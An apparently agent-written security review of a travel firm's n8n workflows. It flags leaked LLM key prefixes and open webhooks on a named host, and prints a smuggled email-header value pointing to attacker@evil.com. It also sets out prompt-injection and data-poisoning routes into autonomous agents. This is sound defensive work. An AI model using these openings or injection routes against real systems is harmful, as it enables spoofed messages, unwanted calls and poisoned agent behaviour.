# n8n Workflow Security Review

Branch: `claude/review-n8n-security-fCPcd`
Date: 2026-05-10 (updated after MCP access opened on 7 workflows)
Scope: 19 workflows discovered via the n8n MCP server.

## CRITICAL — rotate keys today

The `Parallel 3-Model Extract` node in workflow `MwMUPmnGMOc0gDs3`
(`TC — RingSense Insights → Maggie Pattern Extraction`) contains **three
production LLM API keys hardcoded in plaintext** in a `Code` node:

| Provider | Key prefix | Action |
|---|---|---|
| Anthropic | `sk-ant-api03-vhPd…` | Revoke → create new key → store as n8n credential |
| OpenAI | `sk-proj-_NBQlq5W…` | Revoke → new key → n8n credential |
| Google Gemini | `AIzaSyAYM4Ds…` | Revoke/regenerate → n8n credential |

These keys are visible to:

1. Anyone who can read the workflow (`workflow:read` scope).
2. Anyone who can read execution data — and `saveDataSuccessExecution:"all"`
   means every successful run's full code-node output is persisted.
3. The git/version history of the workflow in n8n.

**Fix:** rotate all three keys today, replace the hardcoded constants with
`{{ $credentials.<credName>.apiKey }}` (or simply set them as
`httpHeaderAuth` credentials on each LLM HTTP node — same as the
`Haiku Judge & Dedupe` node already does for Anthropic). Also switch
`saveDataSuccessExecution` to `"none"`.

---

## Per-workflow findings

### A. `4yMbMRvwAPIVsuE4` — TravelCloud AI — Slack Agent Router

3 nodes: `Agent Webhook` → `Route & Format` (Code) → `Post to Slack` (HTTP).

**What it does.** Accepts POST to `/webhook/travelcloud-agent` with a JSON
body `{ agent_type, message, priority }`, maps `agent_type` to one of
7 Slack channel IDs (`sales`, `service`, `ops`, `it`, `approval`, `alert`,
`supervisor`) and posts the message verbatim via Slack OAuth.

**This is the answer to "where are Sales / OPS / Supervisor".** They are
*external* clients of this webhook — not n8n workflows. They almost
certainly live in the Vercel deployment `vertex-ai-ebon.vercel.app`
(referenced by the WhatsApp workflow). This n8n workflow is only the
Slack-write endpoint.

**Findings:**

1. **No authentication on the webhook.** Anyone who guesses or learns the
   URL `https://hfiiii.app.n8n.cloud/webhook/travelcloud-agent` can post to
   any of your 7 internal Slack channels — including `supervisor` and
   `approval`, which probably influence human decisions. This is also a
   phishing primitive: a forged "[OPS AGENT] CRITICAL: please reset Zoho
   admin password" lands in your channel with no provenance.
   *Fix:* add a shared-secret header check at the top of `Route & Format`
   (`if ($input.first().json.headers['x-shared-secret'] !== <secret>)
   throw new Error('unauthorized')`), or move the auth to a Cloudflare
   worker / reverse proxy in front of n8n.
2. **No source identity in the Slack message.** The `text` includes the
   `agent_type` label but nothing about *which* upstream caller produced
   it. An attacker who breaches one agent gets full impersonation of all
   seven labels. *Fix:* require callers to send a signed JWT and put
   `iss`/`sub` in the posted message.
3. **`priority` and `agent_type` are unvalidated.** `agentType` is
   uppercased and put inside `*[${agentType.toUpperCase()} AGENT]*` — a
   newline in `agent_type` lets the attacker forge later Slack mrkdwn lines.
   *Fix:* whitelist `agent_type` against the keys of `channelMap`; reject
   otherwise.
4. **`callerPolicy: workflowsFromSameOwner`** — good.

### B. `6Kqgji1W6NEnvuSF` — TravelCloud CS AI — Mercately WhatsApp Agent

Flow: `Webhook` → `Extract Fields` → `Call Maggie` (Vercel) →
`Send via Mercately` (WhatsApp) → `Find Zoho Contact` → `Update Zoho Fields`
→ `Log Call to Zoho`.

**Findings:**

1. **No webhook authentication.** Path
   `/webhook/travelcloud-whatsapp` will accept anything. The downstream
   `Call Maggie` POSTs the body to your Vercel LLM endpoint as if it were
   a real WhatsApp message, and the LLM's reply is then **sent via
   Mercately to the supplied phone number**. So an attacker can:
   - Send arbitrary WhatsApp messages from your business number to any
     phone number, by POSTing
     `{phone:"+1...", message:"prompt-injection here"}`.
   - Poison your Zoho contact records (update arbitrary contacts' `Via_Getaways_Status`
     and `AI_Sales_Battlecard` fields).
   - Burn LLM credits.
   *Fix:* require a Mercately signing header (Mercately webhooks support
   HMAC) **and** an explicit phone-number allowlist or "must already be a
   Zoho contact" gate before `Send via Mercately`. The fake header
   `x-mercately-webhook: true` is **set by this workflow itself when calling
   Maggie** — that's outbound spoofing, not inbound auth. Remove it.
2. **`Find Zoho Contact` runs *after* `Send via Mercately`.** Messages are
   sent before any check that the phone number is a known contact.
3. **LLM output written to CRM with no review.** `Update Zoho Fields` writes
   `Via_Getaways_Status` and `AI_Sales_Battlecard` straight from the LLM
   reply. A prompt-injected `message` could move every contact to "Hot" or
   plant misleading battlecard content. *Fix:* validate `priority` against
   a closed enum (`Cold`/`Warm`/`Hot`) before the Zoho PUT.
4. **`Log Call to Zoho` description includes raw user message** — that's
   fine in CRM but the same string passes through future LLM calls (Maggie
   conversation memory), so apply the same prompt-injection delimiter
   pattern recommended in the hardening checklist §5.

### C. `DRtB17JVV4MwLDhm` — TC — RingCentral Call End → Maggie AI Follow-up

Flow: `RingCentral Call Ended` (webhook) → `Extract Call Data` → 2× If
gates → `ElevenLabs — Maggie Calls Member` (outbound call!) → `POST to
Vercel /api/ringcentral-zoho` → `Zoho CRM — Create TC Lead` →
`Slack — TC Follow-up Alert`.

**Findings:**

1. **CRITICAL: unauthenticated webhook can trigger outbound robocalls.**
   Path `/webhook/ringcentral-tc`. Body lets you set `from.phoneNumber`
   directly, which becomes the **`to_number`** in the ElevenLabs/Twilio
   `outbound-call` POST. So anyone with the URL can:
   - Make your ElevenLabs AI agent place calls to arbitrary phone numbers
     (TCPA / robocall regulatory risk).
   - Create Zoho leads with attacker-supplied names/phones.
   - Spam your Slack channel `C0AP2P9RVU5`.
   - Burn Twilio/ElevenLabs minutes.
   *Fix:* require RingCentral's `Verification-Token` (or a shared secret
   header), **and** add an allowlist of phone-number ranges your callers
   actually originate from, **and** an outbound-call rate limit per
   destination per day.
2. **Hardcoded ElevenLabs `agent_id` and outbound caller ID** — fine, just
   note them as configuration that should move to env vars.
3. **`callerName` injected into Zoho `lastName` and Slack message body**
   without escaping — attacker controls Slack mrkdwn for the post. Use
   `JSON.stringify` for the Slack body interpolation (Slack will render the
   string raw rather than as markdown).
4. **`saveDataSuccessExecution:"all"`** — same PII retention issue, every
   call payload kept indefinitely.

### D. `MwMUPmnGMOc0gDs3` — TC — RingSense Insights → Maggie Pattern Extraction

Flow: webhook → echo Validation-Token → extract event → gate →
`Parallel 3-Model Extract` (Code) → `Parse + Enrich Patterns` →
`Insert Candidate Patterns` (data_table) → `Slack`.
Branch: `Haiku Judge & Dedupe` → `Parse + Enrich Multi` →
`Insert Multi Patterns`.

**Findings:**

1. **CRITICAL: three hardcoded LLM API keys** — see top of doc. Highest
   priority.
2. **Echo Validation-Token handshake covers subscription creation only.**
   RingCentral only sends `Validation-Token` once when registering the
   subscription; per-event posts have no equivalent header and this
   workflow does not verify them. An attacker who learns the URL can post
   fake "RingSense insights" events, which then:
   - Trigger 3 paid LLM calls (Claude + GPT-4o-mini + Gemini Flash) per
     event → unbounded LLM bill.
   - Insert attacker-controlled "patterns" into your `xHQF7Iz1oL0FWoX0`
     data_table — which is the **training-data source** for the Maggie
     playbook the autonomous agents consume. This is the direct
     poison-the-supervisor vector you were worried about.
   *Fix:* require RingCentral signature or a shared secret on every event
   (not just the handshake). Until that's in place, **disable this
   workflow** — it's the highest-impact attack surface in the inventory.
3. **No approval gate before `Insert Candidate Patterns` / `Insert Multi
   Patterns`.** This is exactly the "agents creating agents on their own"
   risk: a candidate pattern goes straight into the data_table that
   downstream agents use to shape their behavior. Per the hardening
   checklist §3, insert a `Wait → Slack approval` step here.
4. **Refund regex `\b(refund|reembols|devoluci[oó]n|money back)\b`** is a
   decent first pass but trivially bypassed (`re-fund`, `re fund`, `dinero
   de vuelta`, `crédito`). Treat it as defense-in-depth, not the primary
   guard. The primary guard should be the human-approval gate.
5. **`saveDataSuccessExecution:"all"` + `saveManualExecutions:true`** —
   every parsed pattern (and the API keys printed inside the code node's
   output if execution data captures locals) is stored. Switch to
   `"none"` and `false` for success.
6. **`responseMode:"responseNode"`** with `Echo Validation-Token` returning
   an empty body — that's fine for the handshake but means every real
   event also gets a 200 with an empty body. Consider explicitly returning
   `{ ok: true, ignored: true }` on non-handshake events for observability.

### E. `h4btjcQk3vcTkK0z` — System Health Monitor

**Effectively dead code.** The `Run Health Checks` node returns `[]`,
so `Alert Slack` never receives input. The comment says "placeholder —
only alerts on failure once full checks are added". *Risk:* false sense of
security; you think this is monitoring something. Either flesh it out
(check webhook URLs, n8n workflow active status, Vercel agent health) or
deactivate it so it's not misleading.

Side issue: `channel: '#Operations'` uses a name rather than channel ID.
That will silently fail to deliver if the channel is renamed. Use the ID.

### F. `eBshd1k5ucLWJWs6` — TC — New Hot Lead Alert (Zoho → Email)

Flow: schedule (every 5 min) → Zoho `getAll(25)` → JS filter → If hot →
Gmail HTML → Zoho `update`.

**Findings — same HTML/email injection class as `5UMcYzORF4nigho7`:**

1. **`subject` interpolates `Lead_Grade`, `First_Name`, `Last_Name`,
   `Lead_Source` unescaped.** Email subject injection: a lead with
   `Last_Name = "Smith\r\nBcc: attacker@evil.com"` could (depending on
   Gmail's SMTP path normalization) inject headers. Even without that, the
   subject is shown in clients verbatim, so attackers control your inbox
   preview.
2. **HTML `message` body interpolates every lead field unescaped** —
   `First_Name`, `Last_Name`, `Phone`, `Email`, `Lead_Source`, `Destino_11`,
   `Medio`, `Calificar_Paquete_Q_NQ`, `Vendedor`, `TC_Score`, `Lead_Grade`,
   and `$json.id` into an `href`. Same exploit as
   `wvq-005-build-queue-report-html.js` — apply the same `esc()` helper. I'll
   ship a paired patch file.
3. **Hot-lead filter uses `TC_Score >= 60` OR a long source-prefix OR.**
   Functional, but if `Lead_Source` is attacker-controlled (via Facebook
   Lead Ads form fields), they can opt themselves *into* the alert email
   by submitting a source starting with `Network` or `PR -`. Low-severity
   but worth noting.
4. **`Update Lead Status in Zoho` runs *after* a successful email** — fine,
   but if Gmail is rate-limited and fails, the lead is left un-flagged for
   the next 5-min run and may produce duplicate emails. Set `onError` so
   the update still happens, or use an idempotency marker.
5. **`saveDataSuccessExecution:"all"`** — same retention concern.

A patched email body is shipped at
`docs/security/patches/lead-alert-email.html.expr` — paste it into the
`message` parameter of `Send Lead Alert Email`.

### G. `5UMcYzORF4nigho7` — TC — Weekly Verification Queue Report (already reviewed)

Patch in `docs/security/patches/wvq-005-build-queue-report-html.js`.

---

## Cross-cutting issues

1. **Webhooks have no authentication on any of the four inbound endpoints**
   (`travelcloud-agent`, `travelcloud-whatsapp`, `ringcentral-tc`,
   `ringcentral-ringsense`). All four URLs are guessable and host on
   `hfiiii.app.n8n.cloud`. Treat each as publicly accessible — because
   they are. Add at minimum a shared-secret header check.
2. **`saveDataSuccessExecution: "all"` is set on most workflows.** This
   persists PII (phone, email, names, call durations, conversation text)
   indefinitely in the n8n DB. Set success retention to `"none"` and keep
   `"all"` only for `errorWorkflow` runs.
3. **No prompt-injection delimiters** anywhere user text enters an LLM
   prompt (`Parallel 3-Model Extract`, `Call Maggie`, ElevenLabs dynamic
   variables). Apply the patterns in
   `docs/security/supervisor-agent-hardening.md` §5.
4. **No audit table for agent actions.** Every Slack post, every Zoho write,
   every outbound call should be logged append-only — same hardening doc §4.

---

## 2. Autonomous agents creating new agents (UPDATED)

**Confirmed mechanism:** the Maggie loop *plus* the Vercel-hosted
Supervisor/Sales/OPS agents share a single training surface — the
`xHQF7Iz1oL0FWoX0` data_table populated by
`MwMUPmnGMOc0gDs3` without an approval gate. Any pattern that lands in
that table propagates into downstream agent behavior.

Required guardrails before re-activating the Maggie W1/W2/W3 workflows:

1. **Lock down the RingSense webhook** (per §D above) — until that's
   authenticated, anyone can poison the table.
2. **Add a `status:'candidate'` → human-approve → `status:'active'` gate.**
   Patterns are already inserted with `status:'candidate'` — good. But
   nothing currently flips them to `active`. Make that flip require a
   Slack approval click into the `approval` channel
   (`C0AP2QG5TMK`), and *only patterns with `status:'active'` should be
   read by W1's playbook seeder.* This is one schema change + one
   approval node.
3. **Rotate the leaked LLM keys** (top of doc) — until you do, anyone
   with the workflow JSON can run arbitrary Anthropic/OpenAI/Gemini
   queries on your accounts.
4. **Scope the n8n API credential** used by the Maggie workflows: it must
   not have `workflow:create / update / publish` unless W1 specifically
   needs that, and if it does, gate every promotion behind §3 of the
   hardening checklist.
5. **Tripwire**: add a workflow that alerts when the count of
   `status:'active'` rows in the pattern table changes between two
   successive 15-min polls — that's your "the supervisor mutated the
   playbook" alarm.

---

## 3. Workflows still pending review (MCP not enabled)

- `8oMmmqVbPsmqEazg` Maggie — W1 Playbook Init / Reseed
- `IJFL5DWJ5LCgAMAL` Maggie — W2 Extraction Pipeline (02:00 nightly)
- `layXKcZewJV3jhGp` Maggie — W3 Pattern Ranker (04:00 nightly)
- `p0fYHq69WohYcZC7` Facebook Lead Ads → Zoho CRM
- `c6yYzZbXSg25ygTg` RingCentral → Zoho Leads
- `ZByC1P9VYGV28OI2` SimpleLife - AI Voice Follow-up Agent
- `nn4b2pMIkforxmwx` Simplelife Training Agent - Voice Call
- `RE376XBi8WGfEyPT` Global Error Handler → Slack
- `Y67cAGMNf1QeK6Bm` New Lead Alert → Slack
- `dbaOf3Xvgpr7b0bD` Deal Stage Change → Slack
- `1bWPAi0BwsAswyie` Daily Pipeline Summary → Slack
- `KM3Hm9DHiVO8DIle` Angie, personal AI assistant

Toggle **Available in MCP** on the Maggie three first — those close out
the autonomous-agent picture.
